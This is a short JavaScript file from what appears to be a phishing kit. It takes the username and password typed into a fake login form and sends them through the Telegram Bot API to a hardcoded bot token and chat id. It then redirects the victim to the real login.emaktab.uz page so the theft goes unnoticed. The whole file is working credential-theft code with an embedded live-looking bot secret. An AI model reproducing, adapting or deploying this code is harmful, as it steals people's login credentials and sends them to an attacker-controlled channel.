//bot token
var telegram_bot_id = "7175916092:AAHOFLHm5SOrGRKg4P0P6lq8tqIlvd5Vzkw";
//chat id
var chat_id = 7076932696
var u_name, email, message;

var ready = function () {
  u_name = document.getElementById("name").value;
  email = document.getElementById("email").value;
  message = "👤 *Username:*" + u_name + "\n🔒 *Password:*" + email;
};

var sendtelegram = function () {
  ready();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    console.log(response);
    redirectToAnotherPage();
  });
  document.getElementById("name").value = "";
  document.getElementById("email").value = "";
  return false;
};

function redirectToAnotherPage() {
  var anotherPageUrl = "https://login.emaktab.uz/";
  window.location.href = anotherPageUrl;
}
